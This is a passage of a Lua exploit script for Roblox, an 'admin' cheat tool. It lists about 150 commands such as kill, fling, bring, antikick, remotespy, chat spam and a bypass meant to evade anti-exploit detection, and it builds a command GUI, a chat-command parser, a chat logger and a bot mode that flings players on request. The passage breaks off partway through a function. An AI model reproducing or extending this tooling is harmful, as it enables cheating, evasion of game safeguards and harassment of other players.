running admin completely","99 freecam / [speed] - Enables freecam (like flying but not in character), optional [speed] for how fast the freecam should go","100 unfreecam // unfc - Disables freecam","101 fctp [plr] - Teleports your freecam to player","102 gotofc - Teleports you to current freecam position","103 cmds - Opens up this GUI with commands","104 fullcredits - Shows full individual credits for all help with the admin","105 hotkey [key] [cmd] - Creates a hotkey that executes [cmd] when [key] is pressed","106 removehotkey [key] - Removes a hotkey with [key]","107 removeallhotkey - Removes all current hotkeys for commands","108 printhotkeys - Prints all current existing hotkeys","109 os [plr] - Chats the current OS of a player","110 spin [plr] - Makes you spin with a player, tool required","111 unspin - Stops you spinning a player/teleporting to a player","112 explorer - Loads DEX explorer","113 maxzoom [num] - Changes your maxzoom to number","114 stare [plr] - Makes you stare at another player","115 unstare [plr] - Makes you stop staring at player","116 tempgod - Enables temporary FE godmode, does not work on all games, does not break tools","117 void [plr] - Teleports you and a player to the void, requires a tool","118 freefall [plr] - Makes you and a player freefall to the ground","119 version - Shows current admin's version","120 shiftlockon - Enables shift lock if not enabled by game developer","121 copychat [plr] - Makes you copy the chat player says, use uncopychat to stop copying chat","122 newattach [plr] - Does not FE Godmode you, requires 2 tools, attaches you to player","123 newkill [plr] - Does not FE Godmode you, requires 2 tools, kills player","124 newbring [plr] - Does not FE Godmode you, requires 2 tools, brings player","125 spawn [ws/jp/hh/god] [num] - Sets your walkspeed/jumppower/hipheight to number whenever you respawn, or makes you FE Godded whenever you respawn","126 unspawn - Stops you spawning with stats set by "..commandPrefix.."spawn","127 autosavetool [on/off] - Auto saves your tools when you reset","128 beginbot / [mode] - Makes you a bot for other players, type just "..commandPrefix.."beginbot to print available modes","129 endbot / [mode] - Ends "..commandPrefix.."beginbot, optional [mode] to disable one mode only","130 stopsit - Disables your ability to sit","131 gosit - Enables your ability to sit","132 spawnpoint - Sets your spawnpoint for whenever you reset to where you are","133 nospawn - Removes your spawnpoint","134 chaterror - Creates a chat error, works best first time","135 bypass [on/off] - Changes certain commands like "..commandPrefix.."fly so they are not detected by most anti-exploits", "136 fixcam - Fixes your camera in case it breaks", "137 gotoobj [obj] - Teleports you to a part in the workspace, make sure you put the name properly!", "138 breakcam - Makes it so your camera can go through parts, fixed with "..commandPrefix.."fixcam", "139 inviscam - Makes it so your camera goes through parts and makes them transparent so your character is always visible, fixed with "..commandPrefix.."fixcam", "140 printobj / [key] - Prints the object's path clicked to developer console, optional [key] for key pressed instead of click", "141 unprintobj - Stops printobj from running", "142 hotkeyfc [goto/unfc] - If freecam is set as a hotkey, chooses whether to use unfreecam or gotofc when disabling through a hotkey", "143 carpet [plr] - Makes you a carpet for a player", "144 uncarpet - Stops carpet", "145 brickcreate [num] / [pos] [pos] [pos] - Creates [num] amount of bricks from accessories, wont work in all games, optional [pos] for position to create bricks", "146 uncopychat - Stops copying chat", "147 forward / [speed] - Makes you automatically move forward default speed is 1", "148 unforward - Stops you moving automatically forward from forward", "149 id [plr] - Makes you chat the user ID of the player", "150 spinhats / [pow] - Makes all your accessories begin to spin around! Credit to xFunnieuss.", "151 unspinhats - Stops spinhats from spinning accessories", "152 headless - Makes you headless, but cannot control your character after, use grespawn to reset"}
CMDS={"print [msg]","warn [msg]","sit","god","view [plr]","unview","gravity [num]","ungravity","goto [plr]","fecheck","lockws","unlockws","noclip","clip","follow [plr] / [num]","unfollow","fling [plr] / [pow]","unfling","trail [plr] / [num]","untrail","annoy [plr]","unannoy","reset","grespawn","respawn","speed // ws [num]","jumppower // jp [num]","hipheight // hh [num]","default","credits","attach [plr]","fly / [speed]","unfly","kill [plr]","bring [plr]","naked","nolimbs","noarms","nolegs","antikick [on/off]","blockremote [remote] / [service]","remotespy [on/off]","bang [plr] / [speed]","unbang","spam [msg]","spamdelay [num]","unspam","info [plr]","age [plr]","invisible","walk [plr]","glitch [plr] / [num]","tp [plr] [plr]","givetool [plr] / [tool]","givealltools [plr]","blockhats","blocktool","orbit [plr]","unorbit","pos","savepos","loadpos","tppos [num] [num] [num]","pmspam [plr] [msg]","unpmspam","wsvis [num]","bringobj [obj] / [num]","cbring [plr] / [num]","uncbring","cfreeze [plr]","uncfreeze / [plr]","unattach","reach [on/off] / [num]","droptool / [tool]","drophats","hidecmdbar","showcmdbar","prefix [key]","removeinvis","removefog","animation [id/gui] / [speed]","btools","esp [plr]","unesp / [plr]","dice","random [min] [max]","closegame","savetool / [tool]","loadtool / [tool]","savealltool","loadalltool","clicktp / [key]","clickdel / [key]","unclicktp","unclickdel","oof","chatlogs","stopadmin","freecam / [speed] // fc / [speed]","unfreecam // unfc","gotofc","cmds","fullcredits","hotkey [key] [cmd]","removehotkey [key]","removeallhotkey","printhotkeys","os [plr]","spin [plr]","unspin","fctp [plr]","explorer","maxzoom [num]","stare [plr]","unstare [plr]","tempgod","void [plr]","freefall [plr]","version","shiftlockon","copychat [plr]","newattach [plr]","newkill [plr]","newbring [plr]","spawn [ws/jp/hh/god] [num]","unspawn","autosavetool [on/off]","beginbot / [mode]","endbot / [mode]","stopsit","gosit","spawnpoint","nospawn","chaterror", "bypass [on/off]", "fixcam", "gotoobj [obj]", "breakcam", "inviscam", "printobj / [key]", "unprintobj", "hotkeyfc [goto/unfc]", "carpet [plr]", "uncarpet", "brickcreate [num] / [pos] [pos] [pos]", "uncopychat", "forward / [speed]", "unforward", "id [plr]", "spinhats / [pow]", "unspinhats", "headless"} -- 152
local CMDS_GUI_V2 = Instance.new("ScreenGui")
local CMDSmain = Instance.new("Frame")
local CMDSframemain = Instance.new("Frame")
local cmdgui_topframe = Instance.new("Frame")
local closecmdsgui = Instance.new("TextButton")
local cmdgui_midframe = Instance.new("Frame")
local cmdsgui_SearchFunction = Instance.new("TextBox")
local cmdsgui_searchDETAILFRAME = Instance.new("Frame")
local cmdsgui_searchDETAILTEXT = Instance.new("TextLabel")
local ListofCMDS = Instance.new("ScrollingFrame")
local cmdTutorial = Instance.new("TextLabel")
local cmdTutorial_2 = Instance.new("TextLabel")
local cmdTutorial_3 = Instance.new("TextLabel")
local CMDS_Shadow = Instance.new("Frame")
local CMDS_Shadow2 = Instance.new("Frame")
CMDS_GUI_V2.Name = "CMDS_GUI_V2"
CMDS_GUI_V2.Parent = gsCoreGui
CMDSmain.Name = "CMDSmain"
CMDSmain.Parent = CMDS_GUI_V2
CMDSmain.BackgroundColor3 = Color3.new(1, 1, 1)
CMDSmain.BackgroundTransparency = 1
CMDSmain.Position = UDim2.new(0, 695, 0, 297)
CMDSmain.Size = UDim2.new(0, 440, 0, 367)
CMDSmain.AnchorPoint = Vector2.new(0.5, 0.5)
CMDSmain.Visible = false
CMDSmain.ClipsDescendants = true
CMDSframemain.Name = "CMDSframemain"
CMDSframemain.Parent = CMDSmain
CMDSframemain.BackgroundColor3 = Color3.new(0.309804, 0.309804, 0.309804)
CMDSframemain.BorderSizePixel = 0
CMDSframemain.Size = UDim2.new(0, 440, 0, 367)
cmdgui_topframe.Name = "cmdgui_topframe"
cmdgui_topframe.Parent = CMDSframemain
cmdgui_topframe.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
cmdgui_topframe.BorderSizePixel = 0
cmdgui_topframe.Size = UDim2.new(0, 440, 0, 15)
closecmdsgui.Name = "closecmdsgui"
closecmdsgui.Parent = cmdgui_topframe
closecmdsgui.BackgroundColor3 = Color3.new(1, 1, 1)
closecmdsgui.BackgroundTransparency = 1
closecmdsgui.Position = UDim2.new(0, 410, 0, 0)
closecmdsgui.Size = UDim2.new(0, 30, 0, 15)
closecmdsgui.Font = Enum.Font.SourceSansBold
closecmdsgui.Text = "X"
closecmdsgui.TextColor3 = Color3.new(0.968628, 0.968628, 0.968628)
closecmdsgui.TextSize = 20
cmdgui_midframe.Name = "cmdgui_midframe"
cmdgui_midframe.Parent = CMDSframemain
cmdgui_midframe.BackgroundColor3 = Color3.new(0.14902, 0.14902, 0.14902)
cmdgui_midframe.BorderSizePixel = 0
cmdgui_midframe.Position = UDim2.new(0, 0, 0, 15)
cmdgui_midframe.Size = UDim2.new(0, 440, 0, 45)
cmdsgui_SearchFunction.Name = "cmdsgui_SearchFunction"
cmdsgui_SearchFunction.Parent = cmdgui_midframe
cmdsgui_SearchFunction.BackgroundColor3 = Color3.new(1, 1, 1)
cmdsgui_SearchFunction.BackgroundTransparency = 1
cmdsgui_SearchFunction.BorderSizePixel = 0
cmdsgui_SearchFunction.Position = UDim2.new(0, 120, 0, 10)
cmdsgui_SearchFunction.Size = UDim2.new(0, 200, 0, 25)
cmdsgui_SearchFunction.Font = Enum.Font.SourceSans
cmdsgui_SearchFunction.Text = ""
cmdsgui_SearchFunction.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
cmdsgui_SearchFunction.TextScaled = true
cmdsgui_SearchFunction.TextSize = 14
cmdsgui_SearchFunction.TextWrapped = true
cmdsgui_searchDETAILFRAME.Name = "cmdsgui_searchDETAILFRAME"
cmdsgui_searchDETAILFRAME.Parent = cmdsgui_SearchFunction
cmdsgui_searchDETAILFRAME.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
cmdsgui_searchDETAILFRAME.BorderSizePixel = 0
cmdsgui_searchDETAILFRAME.Position = UDim2.new(0, 0, 0, 25)
cmdsgui_searchDETAILFRAME.Size = UDim2.new(0, 200, 0, 2)
cmdsgui_searchDETAILTEXT.Name = "cmdsgui_searchDETAILTEXT"
cmdsgui_searchDETAILTEXT.Parent = cmdsgui_SearchFunction
cmdsgui_searchDETAILTEXT.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
cmdsgui_searchDETAILTEXT.BackgroundTransparency = 1
cmdsgui_searchDETAILTEXT.Size = UDim2.new(0, 200, 0, 25)
cmdsgui_searchDETAILTEXT.Font = Enum.Font.SourceSansLight
cmdsgui_searchDETAILTEXT.Text = "Search"
cmdsgui_searchDETAILTEXT.TextColor3 = Color3.fromRGB(240, 240, 240)
cmdsgui_searchDETAILTEXT.TextSize = 30
ListofCMDS.Name = "ListofCMDS"
ListofCMDS.Parent = CMDSframemain
ListofCMDS.BackgroundColor3 = Color3.new(0.309804, 0.309804, 0.309804)
ListofCMDS.BorderSizePixel = 0
ListofCMDS.Position = UDim2.new(0, 0, 0, 60)
ListofCMDS.Size = UDim2.new(0, 440, 0, 307)
ListofCMDS.CanvasSize = UDim2.new(5, 0, 8, 0)
ListofCMDS.ScrollingDirection = Enum.ScrollingDirection.XY
cmdTutorial.Name = "cmdTutorial"
cmdTutorial.Parent = ListofCMDS
cmdTutorial.BackgroundColor3 = Color3.new(1, 1, 1)
cmdTutorial.BackgroundTransparency = 1
cmdTutorial.BorderSizePixel = 0
cmdTutorial.Position = UDim2.new(0, 5, 0, 5)
cmdTutorial.Size = UDim2.new(0, 420, 0, 20)
cmdTutorial.Font = Enum.Font.SourceSansBold
cmdTutorial.Text = "\"/\" means OPTIONAL argument after"
cmdTutorial.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
cmdTutorial.TextScaled = true
cmdTutorial.TextSize = 14
cmdTutorial.TextWrapped = true
cmdTutorial.TextXAlignment = Enum.TextXAlignment.Left
cmdTutorial_2.Name = "cmdTutorial"
cmdTutorial_2.Parent = ListofCMDS
cmdTutorial_2.BackgroundColor3 = Color3.new(1, 1, 1)
cmdTutorial_2.BackgroundTransparency = 1
cmdTutorial_2.BorderSizePixel = 0
cmdTutorial_2.Position = UDim2.new(0, 5, 0, 25)
cmdTutorial_2.Size = UDim2.new(0, 420, 0, 20)
cmdTutorial_2.Font = Enum.Font.SourceSansBold
cmdTutorial_2.Text = "\"//\" means another way of running command"
cmdTutorial_2.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
cmdTutorial_2.TextScaled = true
cmdTutorial_2.TextSize = 14
cmdTutorial_2.TextWrapped = true
cmdTutorial_2.TextXAlignment = Enum.TextXAlignment.Left
cmdTutorial_3.Name = "cmdTutorial"
cmdTutorial_3.Parent = ListofCMDS
cmdTutorial_3.BackgroundColor3 = Color3.new(1, 1, 1)
cmdTutorial_3.BackgroundTransparency = 1
cmdTutorial_3.BorderSizePixel = 0
cmdTutorial_3.Position = UDim2.new(0, 5, 0, 45)
cmdTutorial_3.Size = UDim2.new(0, 420, 0, 20)
cmdTutorial_3.Font = Enum.Font.SourceSansBold
cmdTutorial_3.Text = "Anything inside \"[ ]\" is an argument for the command"
cmdTutorial_3.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
cmdTutorial_3.TextScaled = true
cmdTutorial_3.TextSize = 14
cmdTutorial_3.TextWrapped = true
cmdTutorial_3.TextXAlignment = Enum.TextXAlignment.Left
CMDS_Shadow.Name = "CMDS_Shadow"
CMDS_Shadow.Parent = CMDSmain
CMDS_Shadow.BackgroundColor3 = Color3.new(0, 0, 0)
CMDS_Shadow.BackgroundTransparency = 0.60000002384186
CMDS_Shadow.BorderSizePixel = 0
CMDS_Shadow.Position = UDim2.new(0, 2, 0, 2)
CMDS_Shadow.Size = UDim2.new(0, 440, 0, 367)
CMDS_Shadow.ZIndex = -1
CMDS_Shadow2.Name = "CMDS_Shadow2"
CMDS_Shadow2.Parent = CMDSmain
CMDS_Shadow2.BackgroundColor3 = Color3.new(0, 0, 0)
CMDS_Shadow2.BackgroundTransparency = 0.80000001192093
CMDS_Shadow2.BorderSizePixel = 0
CMDS_Shadow2.Position = UDim2.new(0, 5, 0, 5)
CMDS_Shadow2.Size = UDim2.new(0, 440, 0, 367)
CMDS_Shadow2.ZIndex = -1
closecmdsgui.MouseButton1Click:Connect(function()
    CMDSmain:TweenSize(UDim2.new(0, 0, 0, 0), "InOut", "Sine", 2)
end)
function CreateCMDlabel(position, text)
    local sizenow = 15
    local cmdHere = Instance.new("TextLabel")
    cmdHere.Name = "cmdHere"
    cmdHere.TextWrapped = true
    cmdHere.Parent = ListofCMDS
    cmdHere.BackgroundColor3 = Color3.new(1, 1, 1)
    cmdHere.BackgroundTransparency = 1
    cmdHere.BorderSizePixel = 0
    cmdHere.Position = position
    cmdHere.Size = UDim2.new(0, 1950, 0, sizenow)
    cmdHere.Font = Enum.Font.SourceSans
    cmdHere.Text = text
    cmdHere.TextWrapped = true
    cmdHere.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
    cmdHere.TextScaled = false
    cmdHere.TextSize = 20
    cmdHere.TextXAlignment = Enum.TextXAlignment.Left
end
for i,_cmds in pairs(searchCmds) do
    CreateCMDlabel(UDim2.new(0, 5, 0, 50 + (i * 15)), _cmds)
end
local UserInputService = game:GetService("UserInputService")
local dragging
local dragInput
local dragStart
local startPos
local function updateCMDS(input)
    local delta = input.Position - dragStart
    local dragTime = 0.055
    local SmoothDrag = {}
    SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    local dragSmoothFunction = gsTween:Create(CMDSmain, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
    dragSmoothFunction:Play()
end
cmdgui_topframe.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = CMDSmain.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)
cmdgui_topframe.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
cmdgui_midframe.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = CMDSmain.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)
cmdgui_midframe.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        updateCMDS(input)
    end
end)
cmdsgui_SearchFunction.Focused:Connect(function()
    cmdsgui_SearchFunction.TextTransparency = 0
    local searchTween = {}
    searchTween.TextColor3 = Color3.new(0.0980392, 0.462745, 0.823529)
    searchTween.TextSize = 18
    searchTween.Position = UDim2.new(0, -70, 0, -15)
    local frameTweenblue = {}
    frameTweenblue.BackgroundColor3 = Color3.new(0.0980392, 0.462745, 0.823529)
    local searchTween1 = gsTween:Create(cmdsgui_searchDETAILTEXT, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), searchTween)
    searchTween1:Play()
    local frameTweenblue1 = gsTween:Create(cmdsgui_searchDETAILFRAME, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), frameTweenblue)
    frameTweenblue1:Play()
end)
cmdsgui_SearchFunction.FocusLost:Connect(function(enterPressed)
    if not enterPressed then
        cmdsgui_SearchFunction.TextTransparency = 1
    else
        cmdsgui_SearchFunction.Text = " "
    end
    local searchTween = {}
    searchTween.TextColor3 = Color3.fromRGB(240, 240, 240)
    searchTween.TextSize = 30
    searchTween.Position = UDim2.new(0, 0, 0, 0)
    local frameTweenblue = {}
    frameTweenblue.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
    local searchTween1 = gsTween:Create(cmdsgui_searchDETAILTEXT, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), searchTween)
    searchTween1:Play()
    local frameTweenblue1 = gsTween:Create(cmdsgui_searchDETAILFRAME, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), frameTweenblue)
    frameTweenblue1:Play()
end)
cmdsgui_SearchFunction.Changed:Connect(function()
    local index = 0
    if cmdsgui_SearchFunction.Text ~= "" then
        for i,v in pairs(ListofCMDS:GetChildren()) do
            if v.Name == "cmdHere" then
                if not string.find(v.Text, cmdsgui_SearchFunction.Text) then
                    v.Visible = false
                else
                    v.Visible = true
                    index = index + 1
                    v.Position = UDim2.new(0, 5, 0, 50 + (index * 15))
                end
            end
        end
    end
end)

-- Command Execution
LP.Chatted:Connect(function(chat)
    run(chat)
end)

function run(msg)
    msg = string.lower(msg)
    local cmdPrefix = string.sub(msg, 1, 1)
    if cmdPrefix == commandPrefix then
        msg = string.sub(msg, 2)
        local args = {}
        for arg in string.gmatch(msg,"[^%s]+") do
            table.insert(args,arg)
        end
        local cmdName = args[1]
        table.remove(args,1)
        local doCmd = Commands[cmdName]
        
        if doCmd ~= nil then
            doCmd(args)
        end
    end
end

-- Command bar
local CommandBar = Instance.new("ScreenGui")
local CMDBAR = Instance.new("Frame")
local CMDBARText = Instance.new("TextBox")
CommandBar.Name = "CommandBar"
CommandBar.Parent = gsCoreGui
CMDBAR.Name = "CMDBAR"
CMDBAR.Parent = CommandBar
CMDBAR.BackgroundColor3 = Color3.new(0.164706, 0.152941, 0.172549)
CMDBAR.BorderSizePixel = 0
CMDBAR.Position = UDim2.new(0.025, 0, 1, 0)
CMDBAR.Size = UDim2.new(0, 270, 0, 35)
CMDBARText.Name = "CMDBARText"
CMDBARText.Parent = CMDBAR
CMDBARText.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
CMDBARText.BorderSizePixel = 0
CMDBARText.Position = UDim2.new(0, 5, 0, 5)
CMDBARText.Size = UDim2.new(0, 260, 0, 25)
CMDBARText.Font = Enum.Font.SourceSansLight
CMDBARText.Text = ""
CMDBARText.TextColor3 = Color3.new(0.933333, 0.933333, 0.933333)
CMDBARText.TextScaled = true
CMDBARText.TextSize = 14
CMDBARText.TextWrapped = true
Mouse.KeyDown:connect(function(Key)
    if Key == string.lower(commandPrefix) then
        CMDBARText:CaptureFocus()
        CMDBAR:TweenPosition(UDim2.new(0.015, 0, 0.95, 0), "Out", "Elastic", 0.5, true)
    end
end)
CMDBARText.FocusLost:connect(function(enterPressed)
    CMDBAR:TweenPosition(UDim2.new(0.015, 0, 1, 0), "Out", "Quad", 0.5, true)
    if enterPressed then
        local cmdmsg = CMDBARText.Text
        CMDBARText.Text = ""
        run(commandPrefix..cmdmsg)
    end
end)
local Match = Instance.new("Frame")
Match.Name = "Match"
Match.Parent = CMDBAR
Match.BackgroundColor3 = Color3.new(0.164706, 0.152941, 0.172549)
Match.BorderSizePixel = 0
Match.Position = UDim2.new(0, 0, -4, 0)
Match.Size = UDim2.new(1, 0, 4, 0)
Match.Visible = false
function CreateOption(Text)
    local Option1 = Instance.new("TextLabel")
    Option1.Name = "Option"
    Option1.Parent = Match
    Option1.BackgroundColor3 = Color3.new(1, 1, 1)
    Option1.BackgroundTransparency = 1
    Option1.Position = UDim2.new(-10, 0, 0, 0)
    Option1.Size = UDim2.new(1, 0, 0, 20)
    Option1.Font = Enum.Font.SourceSans
    Option1.Text = Text
    Option1.TextColor3 = Color3.new(0.952941, 0.952941, 0.952941)
    Option1.TextScaled = true
    Option1.TextWrapped = true
end
for i,cmdtext2 in pairs(CMDS) do
    CreateOption(cmdtext2)
end
CMDBARText.Changed:Connect(function()
    if CMDBARText.Text ~= "" and CMDBARText.Text ~= commandPrefix then
        Match.Visible = true
        local PositionMatch = 0
        for i,cmdtext in pairs(Match:GetChildren()) do
            if cmdtext.Name == "Option" then
                if string.find(cmdtext.Text, CMDBARText.Text) then
                    cmdtext.Position = UDim2.new(0, 0, 0, 2 + (PositionMatch * 20))
                    PositionMatch = PositionMatch + 1
                    if cmdtext.Position == UDim2.new(0, 0, 0, 142) then
                        cmdtext.Position = UDim2.new(-10, 0, 0, 0)
                        PositionMatch = PositionMatch - 1
                    end
                else
                    cmdtext.Position = UDim2.new(-10, 0, 0, 0)
                end
            end
        end
    else
        Match.Visible = false
    end
end)

-- Chat
local ChatLogsv2 = Instance.new("ScreenGui")
local MainChatFrame = Instance.new("Frame")
local Framess = Instance.new("Frame")
local CloseChatGUI = Instance.new("TextButton")
local Frame_222 = Instance.new("Frame")
local PrintChat = Instance.new("TextButton")
local Shadow1 = Instance.new("Frame")
local Shadow2 = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
ChatLogsv2.Name = "ChatLogsv2"
ChatLogsv2.Parent = gsCoreGui
MainChatFrame.Name = "MainChatFrame"
MainChatFrame.Parent = ChatLogsv2
MainChatFrame.BackgroundColor3 = Color3.new(1, 1, 1)
MainChatFrame.BackgroundTransparency = 1
MainChatFrame.Position = UDim2.new(0, 760, 0, 261)
MainChatFrame.Size = UDim2.new(0, 525, 0, 337)
MainChatFrame.Visible = false
Framess.Parent = MainChatFrame
Framess.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Framess.BorderSizePixel = 0
Framess.Size = UDim2.new(0, 525, 0, 15)
CloseChatGUI.Name = "CloseChatGUI"
CloseChatGUI.Parent = Framess
CloseChatGUI.BackgroundColor3 = Color3.new(1, 1, 1)
CloseChatGUI.BackgroundTransparency = 1
CloseChatGUI.BorderSizePixel = 0
CloseChatGUI.Position = UDim2.new(0, 495, 0, 0)
CloseChatGUI.Size = UDim2.new(0, 30, 0, 15)
CloseChatGUI.Font = Enum.Font.SourceSansBold
CloseChatGUI.Text = "X"
CloseChatGUI.TextColor3 = Color3.new(0.945098, 0.945098, 0.945098)
CloseChatGUI.TextSize = 20
Frame_222.Parent = MainChatFrame
Frame_222.BackgroundColor3 = Color3.new(0.14902, 0.14902, 0.14902)
Frame_222.BorderSizePixel = 0
Frame_222.Position = UDim2.new(0, 0, 0, 15)
Frame_222.Size = UDim2.new(0, 525, 0, 50)
PrintChat.Name = "PrintChat"
PrintChat.Parent = Frame_222
PrintChat.BackgroundColor3 = Color3.new(0.870588, 0.25098, 0.25098)
PrintChat.BorderSizePixel = 0
PrintChat.Position = UDim2.new(0, 15, 0, 0)
PrintChat.Size = UDim2.new(0, 170, 0, 30)
PrintChat.Font = Enum.Font.SourceSansLight
PrintChat.Text = "Print Chat"
PrintChat.TextColor3 = Color3.new(0.960784, 0.960784, 0.960784)
PrintChat.TextSize = 30
PrintChat.TextWrapped = true
Shadow1.Name = "Shadow1"
Shadow1.Parent = MainChatFrame
Shadow1.BackgroundColor3 = Color3.new(0, 0, 0)
Shadow1.BackgroundTransparency = 0.5
Shadow1.Position = UDim2.new(0, 2, 0, 2)
Shadow1.Size = UDim2.new(0, 525, 0, 337)
Shadow1.ZIndex = -1
Shadow2.Name = "Shadow2"
Shadow2.Parent = MainChatFrame
Shadow2.BackgroundColor3 = Color3.new(0, 0, 0)
Shadow2.BackgroundTransparency = 0.80000001192093
Shadow2.Position = UDim2.new(0, 5, 0, 5)
Shadow2.Size = UDim2.new(0, 525, 0, 337)
Shadow2.ZIndex = -1
ScrollingFrame.Parent = MainChatFrame
ScrollingFrame.BackgroundColor3 = Color3.new(0.266667, 0.266667, 0.266667)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0, 0, 0, 65)
ScrollingFrame.Size = UDim2.new(0, 525, 0, 271)
ScrollingFrame.CanvasPosition = Vector2.new(0, 403)
ScrollingFrame.ScrollBarThickness = 8
function CreateChatText(plr, chat)
    for i,v in pairs(ScrollingFrame:GetDescendants()) do
        v.Position = v.Position - UDim2.new(0, 0, 0, 20)
        if v.Position == UDim2.new(0, 5, 0, 10) then
            v:Destroy()
        end
    end
    local Example = Instance.new("TextLabel")
    Example.Name = "Example"
    Example.Parent = ScrollingFrame
    Example.BackgroundColor3 = Color3.new(1, 1, 1)
    Example.BackgroundTransparency = 1
    Example.Position = UDim2.new(0, 5, 0, 650)
    Example.Size = UDim2.new(0, 500, 0, 20)
    Example.Font = Enum.Font.SourceSans
    Example.Text = "["..plr.Name.."]: "..chat
    Example.TextColor3 = Color3.new(0.960784, 0.960784, 0.960784)
    Example.TextScaled = true
    Example.TextSize = 20
    Example.TextWrapped = true
    Example.TextXAlignment = Enum.TextXAlignment.Left
end
CloseChatGUI.MouseButton1Click:Connect(function()
    MainChatFrame:TweenPosition(UDim2.new(0, 550, 0, -550), "InOut", "Sine", 2)
    wait(2.01)
    MainChatFrame.Visible = false
end)
printingChat = false
PrintChat.MouseButton1Click:Connect(function()
    if printingChat == false then
        printingChat = true
        PrintChat.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
    elseif printingChat == true then
        printingChat = false
        PrintChat.BackgroundColor3 = Color3.new(0.870588, 0.25098, 0.25098)
    end
end)
local UserInputService = game:GetService("UserInputService")
local dragging
local dragInput
local dragStart
local startPos
local function updateChat(input)
    local delta = input.Position - dragStart
    local dragTime = 0.055
    local SmoothDrag = {}
    SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    local dragSmoothFunction = gsTween:Create(MainChatFrame, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
    dragSmoothFunction:Play()
end
Frame_222.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainChatFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)
Frame_222.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        updateChat(input)
    end
end)

function printChat(player, chat)
    print("["..player.Name.."]: "..chat)
end
complimentReady = true
for i,currentPlayersChatting in pairs(game:GetService("Players"):GetPlayers()) do
    currentPlayersChatting.Chatted:connect(function(chat)
        CreateChatText(currentPlayersChatting, chat)
        if printingChat then
            printChat(currentPlayersChatting, chat)
        end
        if copychatACTIVE then
            if currentPlayersChatting == copychatplayer then
                gsReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chat, "All")
            end
        end
        if modeFling == true then
            if string.lower(string.sub(chat, 1, 7)) == "!fling " then
                if gsWorkspace:PGSIsEnabled() == false then
                    FEGodmode()
                end
                if string.lower(string.sub(chat, 8)) == "me" then
                    run(commandPrefix.."unfling")
                    LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
                    run(commandPrefix.."fling "..currentPlayersChatting.Name.." 2000000")
                else
                    for i,notAll in pairs(findSinglePlayer(string.lower(string.sub(chat, 8)))) do
                        if notAll ~= LP then
                            run(commandPrefix.."unfling")
                            LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
                            run(commandPrefix.."fling "..notAll.Name.." 2000000")
                        end
                    end
                end
            end
        end
        if modeCompliment == true then
            if string.lower(string.sub(chat, 1, 3)) == "!c " then
                if complimentReady then
                    complimentReady = false
                    if string.lower(string.sub(chat, 4)) == "me" then
                        complimentplr(currentPlayersChatting)
                    else
                        for i,Others in pairs(findSinglePlayer(string.lower(string.sub(chat, 4)))) do
                            if Others == LP then
                                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Don't be silly, I can't compliment myself!", "All")
                            else
                                complimentplr(Others)
                            end
                        end
                    end
                    wait(1)
                    complimentReady = true
                end
            end
        end
        if modeMove == true then
            if string.lower(string.sub(chat, 1, 9)) == "!bringbot" then
                run(commandPrefix.."unfollow")
                run(commandPrefix.."unwalk")
                run(commandPrefix.."goto "..currentPlayersChatting.Name)
            elseif string.lower(string.sub(chat, 1, 6)) == "!walk " then
                for i,getWalkPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 7)))) do
